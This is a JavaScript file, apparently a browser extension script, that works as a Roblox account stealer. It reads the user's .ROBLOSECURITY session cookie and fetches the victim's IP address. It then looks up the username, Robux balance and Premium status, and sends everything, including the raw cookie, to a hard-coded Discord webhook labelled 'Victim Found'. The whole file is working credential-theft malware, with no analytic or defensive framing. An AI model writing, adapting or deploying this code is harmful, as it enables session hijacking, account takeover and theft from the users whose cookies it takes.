const WEBHOOK_URL = 'https://discord.com/api/webhooks/1263771745685340174/7sFby8ev6PuQ4bYc883H3lFkYVtG6o70BrZ4_OMwTZAbNzzErmoHSAkMjhRAq0xvYzsv';

async function fetchIP() {
  try {
    const response = await fetch('https://api.ipify.org');
    return await response.text();
  } catch (error) {
    console.error('Error fetching IP:', error);
    return 'IP NOT FOUND';
  }
}

async function fetchUserInfo(cookie) {
  try {
    const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
      headers: { Cookie: '.ROBLOSECURITY=' + cookie },
      redirect: 'manual',
    });
    return await response.json();
  } catch (error) {
    console.error('Error fetching user info:', error);
    return null;
  }
}

async function sendWebhook(data) {
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  } catch (error) {
    console.error('Error sending webhook:', error);
  }
}

async function main(cookie) {
  const ip = await fetchIP();
  const userInfo = cookie ? await fetchUserInfo(cookie) : null;
  const webhookData = {
    content: null,
    embeds: [
      {
        description: `\`\`\`${cookie ? cookie : 'COOKIE NOT FOUND'}\`\`\``,
        color: null,
        fields: [
          {
            name: 'Username',
            value: userInfo ? userInfo.UserName : 'N/A',
            inline: true,
          },
          {
            name: 'Robux',
            value: userInfo ? userInfo.RobuxBalance : 'N/A',
            inline: true,
          },
          {
            name: 'Premium',
            value: userInfo ? userInfo.IsPremium : 'N/A',
            inline: true,
          },
        ],
        author: {
          name: 'Victim Found: ' + ip,
          icon_url: userInfo
            ? userInfo.ThumbnailUrl
            : 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png',
        },
        footer: {
          text: 'https://github.com/ox-y',
          icon_url:
            'https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png',
        },
        thumbnail: {
          url: userInfo
            ? userInfo.ThumbnailUrl
            : 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png',
        },
      },
    ],
    username: 'Roblox',
    avatar_url:
      'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png',
    attachments: [],
  };

  await sendWebhook(webhookData);
}

chrome.cookies.get(
  {
    url: 'https://www.roblox.com/home',
    name: '.ROBLOSECURITY',
  },
  function (cookie) {
    main(cookie ? cookie.value : null);
  }
);
